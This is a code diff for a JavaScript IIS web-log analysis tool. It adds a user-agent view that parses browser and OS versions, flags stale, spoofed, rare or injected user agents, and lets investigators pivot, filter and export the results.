       { label: 'IP profile', onClick: function () { A.nav('ipProfile', ip); } },
       { label: 'URI profile', onClick: function () { A.nav('uriProfile', si.key); } },
+      { label: 'User agent details', onClick: function () { A.nav('uas', A2.ua()); } },
       { label: 'Raw context (\u00b150 lines)', onClick: function () { A.rawContext(store.file[i], store.line[i], st.scope ? st.scope.files : null); } },
       { label: 'Tag row as Attacker', onClick: function () { C.setTag('rows', C.rowKey(st.site.name, store.files[store.file[i]].name, store.line[i]), 'Attacker', true); C.save(); C.audit('tag', { kind: 'rows', tag: 'Attacker' }); st.gridCtl.render(); } },
       { label: 'Tag IP ' + ip + ' as Attacker', onClick: function () { C.setTag('ips', ip, 'Attacker', true); C.save(); C.audit('tag', { kind: 'ips', key: ip, tag: 'Attacker' }); st.gridCtl.render(); } },
@@ -9119,9 +9657,9 @@ var IISLA = IISLA || {};
         var o = rows[r], key = o.k2 || o.key, dmap = { cip: 'cip:', eip: 'cip:', stem: 'stem:=', status: 'status:', method: 'method:', fam: 'family:', ext: 'ext:', user: 'user:=', cls: 'class:', rule: 'rule:', dir: 'dir:', file: 'file:', hour: 'hour:', query: 'query:=' };
         if (cfg.scope === 'index' && cfg.dim === 'cip') { A.nav('ipProfile', key); return; }
         if (cfg.scope === 'index' && cfg.dim === 'stem') { A.nav('uriProfile', o.k2); return; }
+        if (cfg.dim === 'ua') { A.pivot(V.uaFilter(o.key === '(empty)' ? '' : o.key), 'top-n ua'); return; }
         var pre = dmap[cfg.dim]; if (!pre) { UI.toast('No pivot for this dimension', 'warn'); return; }
         var val = cfg.dim === 'hour' ? '' + (+o.key) : (cfg.dim === 'dow' ? o.key.charAt(0) : o.key);
-        if (cfg.dim === 'ua') { val = o.key; }
         A.pivot(pre + (/[\s"]/.test(val) ? '"' + val.replace(/"/g, '') + '"' : val), 'top-n ' + cfg.dim);
       }
     });
@@ -9254,7 +9792,11 @@ var IISLA = IISLA || {};
     b.appendChild(h('div', { className: 'cols2' }, [
       UI.section('Top paths (' + r.stN + (r.stOv ? '+, ' + U.fmtNum(r.stOv) + ' requests to untracked paths' : '') + ')', UI.table(['Stem', 'Requests'], stems.map(function (s) { return [stemLink(s, (idx.stems[s] || {}).raw || s), U.fmtNum(r.st[s])]; }))),
       h('div', null, [UI.section('Rule hits', hitsRows.length ? UI.table(['Sev', 'Rule', 'Name', 'Rows'], hitsRows) : h('p', { className: 'muted' }, 'None')),
-        UI.section('User agents', UI.table(['User agent', 'Requests'], topList(r.ua, 20).map(function (u) { return [u === '-' ? '(empty)' : u.replace(/\+/g, ' '), U.fmtNum(r.ua[u])]; }))),
+        UI.section('User agents' + (r.uaOv ? ' (first ' + r.uaN + ' tracked)' : ''), UI.table(['User agent', 'Flags', 'Requests'], topList(r.ua, 20).map(function (u) {
+          var dec = NS.useragent.decodeKey(u), ur = idx.uas[u], fl = NS.useragent.at(NS.useragent.info(dec), ur ? ur.first : r.first).flags;
+          if (dec && NS.useragent.isRare(ur)) { fl.push('rare'); }
+          return [UI.link(dec || '(empty)', function () { A.nav('uas', u); }, 'User agent details'), h('span', { style: { wordBreak: 'normal' } }, fl.join(' ')), U.fmtNum(r.ua[u])];
+        }))),
         UI.section('Windows', UI.kv([['Max distinct paths / 5 min', r.ms5 + (r.ms5t ? ' at ' + U.fmtTs(r.ms5t) : '')], ['Max login POSTs / window', r.mlogin + (r.mlogint ? ' at ' + U.fmtTs(r.mlogint) : '')], ['Max 401 / window', '' + r.m401], ['Max UAs in a day', r.muaDay + (r.muaDayD ? ' on ' + r.muaDayD : '')], ['First exploit-rule hit', r.firstExp ? U.fmtTs(r.firstExp) : 'none']])),
         UI.section('Related IPs (share a rare user agent or rare path)', related.length ? UI.table(['IP', 'Shared', 'Requests'], related.slice(0, 30).map(function (x) { return [ipLink(x.ip), x.why, U.fmtNum((idx.ips[x.ip] || {}).n || 0)]; })) : h('p', { className: 'muted' }, 'None found'))])
     ]));
@@ -9371,6 +9913,161 @@ var IISLA = IISLA || {};
         }, 10);
       }
     }
+  };
+
+  /* ======================= USER AGENTS ======================= */
+  var UAN = NS.useragent;
+  var UA_NONBROWSER = { scanner: 1, library: 1, bot: 1, 'webshell-client': 1, empty: 1, other: 1 };
+  var UA_WEIGHT = { inject: 6, impossible: 5, headless: 3, malformed: 3, eol: 2, 'eol-os': 2, stale: 1, rare: 1 };
+  /* Quick filter that selects exactly this user agent (exact match on the decoded string). */
+  V.uaFilter = function (dec) {
+    if (!dec) { return 'ua:empty'; }
+    if (dec.indexOf('"') < 0) { return 'ua:="' + dec + '"'; }
+    var parts = dec.split('"').sort(function (a, b) { return b.length - a.length; }); // quotes cannot be quoted: longest quote-free part, contains
+    return 'ua:"' + parts[0] + '"';
+  };
+  /* One row per distinct user agent: index scope from idx.uas, loaded scope grouped from the grid view. */
+  V.uaRows = function (scope) {
+    var out = [], k, u, i;
+    function finish(r) {
+      r.info = UAN.info(r.dec); var at = UAN.at(r.info, r.first);
+      r.age = at.age; r.flags = at.flags.slice(); r.why = at.why;
+      if (r.dec && r.rare) { r.flags.push('rare'); r.why.rare = 'seen from ' + r.ipN + ' client' + (r.ipN === 1 ? '' : 's') + ' (' + r.pubN + ' public) in ' + (scope === 'index' ? 'the whole corpus' : 'the loaded rows'); }
+      r.nonBrowser = UA_NONBROWSER[r.fam] === 1;
+      r.score = (r.nonBrowser && r.fam !== 'bot' ? 1 : 0) + (r.xok > 0 && (r.flags.length || r.nonBrowser) ? 2 : 0);
+      for (i = 0; i < r.flags.length; i++) { r.score += UA_WEIGHT[r.flags[i]] || 0; }
+      out.push(r);
+    }
+    if (scope === 'index') {
+      for (k in st.idx.uas) {
+        u = st.idx.uas[k];
+        var ips = []; for (i in u.ips) { ips.push(i); }
+        finish({ key: k, dec: UAN.decodeKey(k), fam: u.fam, n: u.n, ipN: u.ipN, ipOv: u.ipOv, pubN: u.pubN, s2: u.s2, s3: u.s3, s4: u.s4, s5: u.s5, post: u.post, exec: u.exec, xok: u.xok, hits: u.hits,
+          first: u.first, last: u.last, fFile: u.fFile, fLine: u.fLine, fIp: u.fIp, ips: ips, rare: UAN.isRare(u) });
+      }
+      return out;
+    }
+    var s = st.store, view = st.grid.view || F.apply(s, null), g = {}, j, ix, id, x, scl, pub, post = s.t.method.find('POST'), ipv = s.t.ip.vals;
+    for (j = 0; j < view.length; j++) {
+      ix = view[j]; id = s.ua[ix]; x = g[id];
+      if (!x) { var ui = s.uaInfo[id]; x = g[id] = { key: s.t.ua.vals[id], dec: ui.dec, fam: ui.fam, n: 0, ipSet: {}, ipN: 0, ipOv: 0, pubN: 0, s2: 0, s3: 0, s4: 0, s5: 0, post: 0, exec: 0, xok: 0, hits: 0, first: s.ts[ix], last: s.ts[ix], fFile: s.file[ix], fLine: s.line[ix], fIp: ipv[s.eip[ix]] }; }
+      x.n++; scl = s.status[ix] >= 0 ? Math.floor(s.status[ix] / 100) : 0; pub = (s.flags[ix] & St.FLAGS.PUB) !== 0;
+      if (s.ts[ix] < x.first) { x.first = s.ts[ix]; x.fFile = s.file[ix]; x.fLine = s.line[ix]; x.fIp = ipv[s.eip[ix]]; } if (s.ts[ix] > x.last) { x.last = s.ts[ix]; }
+      if (x.ipSet[s.eip[ix]] === undefined) { x.ipSet[s.eip[ix]] = 1; x.ipN++; if (pub) { x.pubN++; } }
+      if (scl === 2) { x.s2++; } else if (scl === 3) { x.s3++; } else if (scl === 4) { x.s4++; } else if (scl === 5) { x.s5++; }
+      if (s.method[ix] === post) { x.post++; }
+      if (s.flags[ix] & St.FLAGS.EXEC) { x.exec++; if (scl === 2 && pub) { x.xok++; } }
+      if (s.flags[ix] & St.FLAGS.HITS) { x.hits++; }
+    }
+    for (k in g) { x = g[k]; x.ips = Object.keys(x.ipSet).map(function (q) { return ipv[+q]; }); delete x.ipSet; x.rare = UAN.isRare(x); finish(x); }
+    return out;
+  };
+  V.uas = function (main, focusKey) {
+    if (!st.idx && !st.store) { needIndex(main, 'User agents'); return; }
+    var cfg = st.uaCfg || (st.uaCfg = { scope: st.idx ? 'index' : 'loaded', show: 'unusual', q: '' });
+    if (cfg.scope === 'index' && !st.idx) { cfg.scope = 'loaded'; }
+    if (cfg.scope === 'loaded' && !st.store) { cfg.scope = 'index'; }
+    var b = page(main, 'User agents', null, 'Each distinct user agent with its browser, how old that browser version was when first seen, the operating system and flags. Double-click a row to filter the rows to it.');
+    var q = UI.input(cfg.q, { placeholder: 'substring', style: { width: '220px' } });
+    var staleIn = UI.input(UAN.cfg.staleDays, { style: { width: '55px' }, title: 'A browser version older than this many days at the time of the request is flagged stale' });
+    var rareIn = UI.input(UAN.cfg.rareIps, { style: { width: '40px' }, title: 'A user agent seen from no more than this many clients is flagged rare' });
+    var go = function () {
+      cfg.q = q.value;
+      var sd = parseInt(staleIn.value, 10), rr = parseInt(rareIn.value, 10);
+      if (sd > 0 && rr > 0 && (sd !== UAN.cfg.staleDays || rr !== UAN.cfg.rareIps)) {
+        st.settings.uaStaleDays = sd; st.settings.uaRareIps = rr; UAN.configure(st.settings);
+        try { C.saveSettings(st.settings); } catch (e) { }
+        if (st.store) { A.applyGrid(); } // uaflag: filters depend on the thresholds
+      }
+      A.nav('uas');
+    };
+    q.onkeydown = staleIn.onkeydown = rareIn.onkeydown = function (e) { if ((e || window.event).keyCode === 13) { go(); } };
+    var shows = [['unusual', 'Unusual (any flag or non-browser)'], ['all', 'All user agents'], ['outdated', 'Outdated: stale or end of support'], ['spoofed', 'Spoofed: impossible, malformed, automation'],
+      ['inject', 'Exploit payloads'], ['rare', 'Rare'], ['nonbrowser', 'Non-browser families'], ['execok', 'Unusual and reaching executable handlers (public 2xx)']];
+    UAN.FLAGS.forEach(function (f) { shows.push(['flag:' + f, 'Flag: ' + f]); });
+    b.appendChild(h('div', { className: 'row' }, [
+      UI.field('Scope', UI.select([['index', 'Whole corpus (index)'], ['loaded', 'Loaded rows (current grid filter)']], cfg.scope, function (v) { cfg.scope = v; A.nav('uas'); })),
+      UI.field('Show', UI.select(shows, cfg.show, function (v) { cfg.show = v; A.nav('uas'); })),
+      UI.field('Search', q), UI.field('Stale after (days)', staleIn), UI.field('Rare: clients ≤', rareIn), UI.btn('Apply', go, 'primary'),
+      UI.btn('Export CSV', function () { V.exportDialog(); })
+    ]));
+    if (!UAN.loaded) { b.appendChild(h('div', { className: 'warn' }, 'lists\\browser-releases.txt was not found: browser ages, stale and future-version checks are unavailable.')); }
+    var all = cfg.scope === 'index' ? V.uaRows('index') : V.uaRows('loaded');
+    var counts = { nonbrowser: 0 }, i, ql = cfg.q.toLowerCase();
+    UAN.FLAGS.forEach(function (f) { counts[f] = 0; });
+    all.forEach(function (r) { r.flags.forEach(function (f) { counts[f]++; }); if (r.nonBrowser) { counts.nonbrowser++; } });
+    function has(r, list) { for (var z = 0; z < list.length; z++) { if (r.flags.indexOf(list[z]) >= 0) { return true; } } return false; }
+    var pick = {
+      all: function () { return true; }, unusual: function (r) { return r.flags.length > 0 || r.nonBrowser; }, outdated: function (r) { return has(r, ['stale', 'eol', 'eol-os']); },
+      spoofed: function (r) { return has(r, ['impossible', 'malformed', 'headless']); }, inject: function (r) { return has(r, ['inject']); }, rare: function (r) { return has(r, ['rare']); },
+      nonbrowser: function (r) { return r.nonBrowser; }, execok: function (r) { return r.xok > 0 && (r.flags.length > 0 || r.nonBrowser); }
+    };
+    var pf = cfg.show.indexOf('flag:') === 0 ? (function (f) { return function (r) { return r.flags.indexOf(f) >= 0; }; }(cfg.show.substr(5))) : (pick[cfg.show] || pick.unusual);
+    function isFocus(r) { return !!focusKey && (r.key === focusKey || r.dec === focusKey); } // raw index key or decoded string
+    var list = all.filter(function (r) { return isFocus(r) || (pf(r) && (!ql || r.dec.toLowerCase().indexOf(ql) >= 0)); }); // the user agent asked for is always listed
+    list.sort(function (a, c) { return c.score - a.score || c.xok - a.xok || a.n - c.n || (a.dec < c.dec ? -1 : 1); });
+    // flag summary: click a count to show those user agents
+    var chips = h('div', { className: 'row' }, [h('span', { className: 'muted' }, U.fmtNum(all.length) + ' user agents: ')]);
+    UAN.FLAGS.concat(['nonbrowser']).forEach(function (f) {
+      var key = f === 'nonbrowser' ? 'nonbrowser' : 'flag:' + f, on = cfg.show === key;
+      chips.appendChild(h('span', { className: 'chip' + (on ? ' on' : ''), style: on ? { background: '#2b6cb0', borderColor: '#2b6cb0' } : null, title: f === 'nonbrowser' ? 'scanner, library, bot, web shell client, empty or unrecognised' : UAN.FLAG_HELP[f],
+        onclick: function () { cfg.show = on ? 'unusual' : key; A.nav('uas'); } }, (f === 'nonbrowser' ? 'non-browser' : f) + ' ' + U.fmtNum(counts[f])));
+    });
+    b.appendChild(chips);
+    var idx = st.idx, ev = cfg.scope === 'index' && idx && idx.caps.uaEvicted ? ' · ' + U.fmtNum(idx.caps.uaEvicted) + ' rarely seen user agents without rule hits were dropped at the index cap (' + U.fmtNum(idx.caps.uaCap) + '); load rows for the complete picture' : '';
+    b.appendChild(h('div', { className: 'muted small' }, U.fmtNum(list.length) + ' shown, most unusual first' + (cfg.scope === 'index' ? ' · clients and public clients are counted up to 20' : ' · grouped from ' + U.fmtNum((st.grid.view || []).length || st.store.n) + ' loaded rows') + ev));
+    var split = h('div', { className: 'split-v' }), top = h('div', { className: 'split-top' }), detail = h('div', { className: 'split-bottom detail' });
+    split.appendChild(top); split.appendChild(detail); b.appendChild(split);
+    var cols = [{ key: 'ua', label: 'User agent', w: 400 }, { key: 'flags', label: 'Flags', w: 170 }, { key: 'browser', label: 'Browser', w: 125 }, { key: 'os', label: 'OS', w: 120 },
+      { key: 'rel', label: 'Released', w: 85 }, { key: 'age', label: 'Age at first (d)', w: 85, num: true }, { key: 'fam', label: 'Family', w: 80 }, { key: 'n', label: 'Requests', w: 75, num: true },
+      { key: 'ips', label: 'Clients', w: 58, num: true }, { key: 'pub', label: 'Public', w: 55, num: true }, { key: 's2', label: '2xx', w: 60, num: true }, { key: 's4', label: '4xx', w: 60, num: true },
+      { key: 's5', label: '5xx', w: 50, num: true }, { key: 'xok', label: 'Exec 2xx pub', w: 80, num: true }, { key: 'hits', label: 'Hit rows', w: 65, num: true },
+      { key: 'first', label: 'First (UTC)', w: 135 }, { key: 'last', label: 'Last (UTC)', w: 135 }];
+    function cellv(r, c) {
+      var x = list[r];
+      switch (c) {
+        case 'ua': return x.dec || '(empty)'; case 'flags': return x.flags.join(' '); case 'browser': return x.info.name; case 'os': return x.info.os;
+        case 'rel': return x.info.rel ? (x.info.rel.est === 2 ? '~' : '') + UAN.fmtDate(x.info.rel.ms) : ''; case 'age': return x.age === null ? '' : U.fmtNum(x.age); case 'fam': return x.fam;
+        case 'n': return U.fmtNum(x.n); case 'ips': return x.ipN + (x.ipOv ? '+' : ''); case 'pub': return '' + x.pubN; case 's2': return U.fmtNum(x.s2); case 's4': return U.fmtNum(x.s4);
+        case 's5': return U.fmtNum(x.s5); case 'xok': return U.fmtNum(x.xok); case 'hits': return U.fmtNum(x.hits); case 'first': return tsCell(x.first); case 'last': return tsCell(x.last);
+      }
+      return '';
+    }
+    st.uaLast = { title: 'User agents (' + cfg.scope + ', ' + cfg.show + (cfg.q ? ', "' + cfg.q + '"' : '') + ')', headers: ['User agent', 'Raw', 'Flags', 'Reasons', 'Browser', 'OS', 'Released', 'Age at first (days)', 'Family', 'Requests', 'Clients', 'Public clients', '2xx', '3xx', '4xx', '5xx', 'POST', 'Executable', 'Executable 2xx public', 'Rule-hit rows', 'First UTC', 'Last UTC', 'First client', 'First file', 'First line', 'Clients (up to 20)'],
+      rows: list.map(function (x) { return [x.dec, x.key, x.flags.join(' '), x.flags.map(function (f) { return f + ': ' + x.why[f]; }).join('; '), x.info.name, x.info.os, x.info.rel ? UAN.fmtDate(x.info.rel.ms) + (x.info.rel.est === 2 ? ' (extrapolated)' : '') : '', x.age === null ? '' : x.age, x.fam,
+        x.n, x.ipN + (x.ipOv ? '+' : ''), x.pubN, x.s2, x.s3, x.s4, x.s5, x.post, x.exec, x.xok, x.hits, U.fmtIso(x.first), U.fmtIso(x.last), x.fIp, ((cfg.scope === 'index' ? st.idx.files : st.store.files)[x.fFile] || {}).name || '', x.fLine, x.ips.slice(0, 20).join(' ')]; }) };
+    function pivot(x) { A.pivot(V.uaFilter(x.dec), 'user agent'); }
+    function loadRows(x) { A.load({ fileIds: A.fileIdsForRange(x.first, x.last), preText: V.uaFilter(x.dec), label: 'user agent ' + (x.info.name || x.fam) }); }
+    var grid = new UI.VGrid(top, { columns: cols, count: function () { return list.length; }, cell: cellv,
+      rowClass: function (r) { var f = list[r].flags; return f.indexOf('inject') >= 0 || f.indexOf('impossible') >= 0 ? 'sevrow-high' : (f.indexOf('eol') >= 0 || f.indexOf('headless') >= 0 || f.indexOf('malformed') >= 0 ? 'sevrow-medium' : '') + (list[r].xok > 0 && f.length ? ' hit2' : ''); },
+      onSelect: function (r) { showDetail(list[r]); },
+      onActivate: function (r) { pivot(list[r]); },
+      onContext: function (r, key, x, y) {
+        var u = list[r];
+        UI.menu(x, y, [{ label: st.store ? 'Filter grid to this user agent' : 'Load rows with this user agent', onClick: function () { pivot(u); } }, { label: 'Load all rows with this user agent', onClick: function () { loadRows(u); } },
+          { label: 'Raw context of first occurrence', onClick: function () { A.rawContext(u.fFile, u.fLine); } }, { label: 'IP profile of first client ' + u.fIp, disabled: !st.idx || !u.fIp, onClick: function () { A.nav('ipProfile', u.fIp); } },
+          { sep: true }, { label: 'Copy user agent', onClick: function () { UI.copy(u.dec); } }, { label: 'Copy quick filter', onClick: function () { UI.copy(V.uaFilter(u.dec)); } }]);
+      }
+    });
+    function showDetail(x) {
+      UI.clear(detail);
+      var ipsEl = h('span');
+      x.ips.slice(0, 20).forEach(function (ip, j) { if (j) { ipsEl.appendChild(document.createTextNode(', ')); } ipsEl.appendChild(st.idx ? ipLink(ip) : document.createTextNode(ip)); });
+      var fs = st.idx ? st.idx.findings.filter(function (f) { return f.entity === 'ua' && f.key === x.dec; }) : [];
+      var why = h('div'); x.flags.forEach(function (f) { why.appendChild(h('div', null, [h('b', null, f + ': '), x.why[f]])); });
+      detail.appendChild(h('div', { className: 'row' }, [UI.btn(st.store ? 'Filter grid to this user agent' : 'Load rows with this user agent', function () { pivot(x); }, 'primary'), UI.btn('Load all rows', function () { loadRows(x); }),
+        UI.btn('Raw context of first occurrence', function () { A.rawContext(x.fFile, x.fLine); }), UI.btn('Copy', function () { UI.copy(x.dec); })]));
+      detail.appendChild(UI.kv([['User agent', x.dec || '(empty)', 'mono'], ['Flags', x.flags.length ? why : 'none'],
+        ['Parsed', (x.info.name || 'not a recognised browser') + (x.info.os ? ' on ' + x.info.os : '') + ' · family ' + x.fam + (x.info.rel ? ' · released ' + (x.info.rel.est === 2 ? 'about ' : '') + UAN.fmtDate(x.info.rel.ms) + (x.info.rel.est === 1 ? ' (interpolated)' : x.info.rel.est === 2 ? ' (extrapolated: add newer releases to lists\\browser-releases.txt)' : '') : '') + (x.age !== null ? ' · ' + U.fmtNum(x.age) + ' days old when first seen' : '')],
+        ['Seen', tsCell(x.first) + '  →  ' + tsCell(x.last) + ' UTC · first by ' + x.fIp],
+        ['Requests', U.fmtNum(x.n) + ' · 2xx ' + U.fmtNum(x.s2) + ' · 3xx ' + U.fmtNum(x.s3) + ' · 4xx ' + U.fmtNum(x.s4) + ' · 5xx ' + U.fmtNum(x.s5) + ' · POST ' + U.fmtNum(x.post) + ' · executable ' + U.fmtNum(x.exec) + ' (public 2xx ' + U.fmtNum(x.xok) + ') · rule-hit rows ' + U.fmtNum(x.hits)],
+        ['Clients', [ipsEl, x.ipOv ? '  (more than ' + x.ipN + '; list truncated)' : '', '  · ' + x.pubN + ' public']],
+        fs.length ? ['Findings', h('span', null, fs.map(function (f, j) { return h('span', null, [j ? ', ' : '', UI.link(f.id + ' ' + f.ruleId + ' ' + f.severity, function () { A.nav('findings', f.id); })]); })), 'warn'] : null]));
+    }
+    if (list.length) {
+      var sel = 0; if (focusKey) { for (i = 0; i < list.length; i++) { if (isFocus(list[i])) { sel = i; } } }
+      grid.select(sel);
+    } else { detail.appendChild(h('p', { className: 'muted' }, 'No user agents match. Choose "All user agents" under Show to list every one.')); }
   };
 
   /* ======================= SESSIONS ======================= */
